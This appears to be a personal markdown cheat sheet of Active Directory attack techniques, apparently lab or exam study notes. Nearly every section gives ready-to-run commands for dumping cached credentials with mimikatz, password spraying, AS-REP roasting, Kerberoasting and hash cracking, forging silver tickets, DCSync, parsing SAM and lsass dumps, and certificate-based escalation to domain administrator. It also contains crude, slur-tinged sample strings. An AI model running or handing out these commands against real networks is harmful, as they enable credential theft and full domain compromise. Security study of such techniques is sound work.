# AD AuthN Basic
- window fucking 全家桶: https://github.com/Flangvik/SharpCollection 
- Domain Expansion: I'd Win <img src="905673665fe7248681682d11b5739501.png" width="50">
## AuthN Type
1. NTLM 
   <img src="efc3ae731d085f29a1673782d583e64d-ad_ntlm.png" width="400">
2. Kerberos 
   <img src="b5e6b0ecb201daef973f507049049029-ad_kerbauth.png" width="400">

## Cached AD Credential
- w/ mimikatz
- ```privilege::debug``` to engage the SeDebugPrivlege8 privilege, which will allow us to interact with a process owned by another account.
- ``` sekurlsa::logonpasswords ``` get cached password that loggin this pc
- ``` sekurlsa::tickets ``` get cached ticket 
- DPAPI cred dump :https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords  
1.  ``` 
    dpapi::masterkey /in:\users\0xdf\desktop\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:{password}

    dpapi::cred /in:\users\0xdf\desktop\credentials
    ```

# Attack AD
## Password attack/ Spray
- ``` net accounts ``` get account policy e.g. logout time
1. DirectoryService (low & slow)
    - Run in Windows Env.
    - Get LDAP path (reference ch21)
    - ``` New-Object System.DirectoryServices.DirectoryEntry($LDAPpath, {username}, {passowrd}) ``` test if return normal result. If yes = correct , if false = nope 
    - DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1 #NoFullAutoInTheBuilding! 🔫🔫🔫🔫🔫🔫
2. SMB (Nois & slow)
    - Run in Kali Env
    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com (--continue-on-success OR --shares OR --users) ``` 
    - ``` -pass-pol ``` check password policy (before brute force)
    - If have local admin rights of that ac will show "Pwd3d!"
3. Kerberos TGT
    - Run in Windows/ Kali
    - Kerbrute: https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
    - ``` .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!" ```

## AS-REP Roasting
- If without Kerberos pre-authN
- Linux (Kali way) 
1. ``` impacket-GetNPUsers -dc-ip {domain controller ip!!}  -request -outputfile as-rep-roasted.txt corp.com/pete ``` Grap the AS-REP packet
2. ``` sudo hashcat -m 18200 as-rep-roasted.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -n 20 ``` 

- Windows (victim way)
1. Rubeus: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
2. ``` .\Rubeus.exe asreproast /nowrap ```
3. hashcat 

## Kerberoast (TGS-REP)
- Target service accounts
- The service ticket is encrypted using the SPN's password hash.
- m=13100 hashcat
- Linux (kali way)
1. ``` sudo impacket-GetUserSPNs -request -dc-ip {domain controller ip} corp.com/pete ```
2. hashcat

- Windows (victim way)
1. ``` .\Rubeus.exe kerberoast /outfile:hashes.kerberoast ```
2. hashcat crack ``` 13100 ```

## Pass hash by certificate
- https://github.com/GhostPack/Certify
- (cert may get from certify.exe or other places)
- ``` .\Rubeus.exe asktgt /user:administrator /certificate:xxx.pfx /getcredentials /show /nowrap``` show ntlm hash

## Silver Tickets
- ** If the user is service account, High Prob can impersonate as Administrator e.g. mssql_svc, smb_svc, etc **
- Target forging TGS
- Requires: 
    1. SPN password hash
    2. Domain SID
    3. Target SPN
- Use ticket accesss HTTP SPN resource
- Windows (victim way)
1. Find that service admin hash in cached data w/ ```mimikatz> sekurlsa::logonpasswords ``` 
2. Domain sid ```pwsh> whoami /user ``` ``` S-1-5-21-1987370270-658905905-1781884369-1105 ``` BUT ignore last segment ``` -1105```
3. Target SPN e.g. web6969.corp.com
4. Run ```mimikatz> kerberos::golden /sid:{sid} /domain:corp.com /ptt /target:{target spn} /service:http /rc4:{hashes} /user:{user you want to impersonate} ```
5. check tickets ```pwsh> klist ```
6. try access kerberos services: ``` iwr -UseDefaultCredentials http://web04 ```

- Linux (Kali way)
1. Impersonate Administrator via Silver Ticket (w/ service account):
2. Silver/Golden ticket ``` impacket-ticketer -nthash {nthash} -domain-sid {domain-sid} -domain nagoya-industries.com -spn {spn} -user-id 500 Administrator ```
3. get env var: ``` export KRB5CCNAME=$PWD/Administrator.ccache ```
4. Create file under /etc/brb5user.conf
   ```
    [libdefaults]
            default_realm = NAGOYA-INDUSTRIES.COM
            kdc_timesync = 1
            ccache_type = 4
            forwardable = true
            proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
            fcc-mit-ticketflags = true

    [realms]        
            NAGOYA-INDUSTRIES.COM = {
                    kdc = nagoya.nagoya-industries.com
            }

    [domain_realm]
            .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
    ```

## Domain Controller Sync
- Only works in sync turned on DC (Production real world will have)
- Requires DCsync Rights( Replicating Directory Changes Permissions )
- NLTM module 1000
- Windows (Victim way)
  1. Login to DC admin
  2. Obtain any user credentials(hashed) ``` lsadump::dcsync /user:corp\dave ```
- Linux (Kali way)
1. ``` impacket-secretsdump -just-dc-user {target user to get} corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@{dc_ip} ```
2. Another way (maybe care about datetime)
    ``` 
    export KRB5CCNAME=ticket.ccache
    impacket-secretdump -k -no-pass {domain name}
    ```

# Generate TGT
- get the ccache ticket for kerberos authN ``` impacket-getTGT {ocsp.exam}/{hoidam} ```

## Rubeus tgtdeleg
- ``` .\rubeus.exe tgtdeleg /nowrap ```
- decode the kirbi with base 64 ``` cat {ticket.kirbi} | base64 -d > {ticket.kirbi} ```

## Convert kirbi to ccache
- For linux use
  - ``` kirbi2ccache {xx.kirbi} {xx.ccache} ```
  - ``` impacket-ticketConverter {xx.kirbi} {xx.ccache} ```
- Set ticket at the begining of the command in linux
  - ``` KRB5CCNAME=ticket.ccache psexec -k -no-pass {domain}/{username}@{dc-domain-ip} ```

# Working around with dumps
## Attacking with SAM (security database manager)
- usually can be found in old windows
  1. dump them to kali (including sam & system)
  2. impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

## lsass.dmp
- forensics dump 
- https://github.com/skelsec/pypykatz
- ``` pypykatz lsa mimidump {file} ``` read detail

## Certipy-ad privesc to domain admin
- try more times on reruning the command if timeed out
- ``` 
    certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 192.168.244.30 -bloodhound


    [****Try step2 first***** if not working then go step 1 ]
    certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.244.30 -debug

    certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.244.30
   ```
- try harder: https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html


## Clock Skew issue
1. https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069